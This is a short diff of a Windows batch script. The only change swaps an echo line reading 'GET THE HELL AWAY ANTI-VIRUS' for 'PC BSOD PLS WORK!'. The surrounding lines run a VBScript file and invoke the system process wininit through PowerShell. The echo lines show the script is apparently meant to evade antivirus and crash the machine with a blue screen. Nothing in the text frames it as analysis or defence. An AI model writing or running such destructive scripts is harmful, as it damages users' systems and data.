@@ -28,6 +28,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 @echo on
-echo GET THE HELL AWAY ANTI-VIRUS
+echo PC BSOD PLS WORK!
 C:\Wind1\msg.vbs
 powershell wininit
